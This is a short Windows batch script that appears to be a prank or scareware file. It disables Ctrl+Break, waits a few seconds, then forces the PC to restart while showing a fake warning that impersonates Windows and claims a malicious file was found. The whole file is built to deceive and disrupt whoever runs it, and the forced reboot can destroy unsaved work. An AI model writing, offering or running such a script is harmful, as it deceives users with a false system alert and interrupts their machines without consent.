@echo off
break off
cls
goto main

:main
timeout 3
shutdown -r -t 17 /c "Windows has detected a malicious file on your computer, we will shutdown your PC in order to prevent further damage."
exit